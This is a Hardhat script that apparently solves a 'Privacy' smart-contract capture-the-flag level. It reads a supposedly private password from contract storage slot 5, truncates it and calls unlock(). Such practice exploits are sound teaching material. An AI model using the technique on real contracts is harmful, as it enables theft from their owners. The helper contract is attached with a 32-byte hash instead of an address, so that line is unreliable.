const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // attach your instance address
  const Instance = "0xF298dbdf56Cf8Ce264b6838ED46199F72987Bf71";
  const PrivacyContract = await ethers.getContractFactory("Privacy");
  const Privacy = PrivacyContract.attach(Instance);
  const CutBytes32Contract = await ethers.getContractFactory("CutBytes32");
  const CutBytes32 = CutBytes32Contract.attach(
    "0xdfa9047893ff2b14c3f466f89da95080a0704dc2bee6753c3f49810446d53bf8"
  );
  // or slice it by `${keyData.slice(0, 34)}`
  const locked = await Privacy.locked();
  const password = await ethers.provider.getStorageAt(Privacy.address, 5);
  const unlockPassword = await CutBytes32.cutBytes32(password);
  console.log(unlockPassword);
  await Privacy.unlock(unlockPassword[0]);
  const locked1 = await Privacy.locked();
  console.log(password);
  console.log(locked, locked1);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
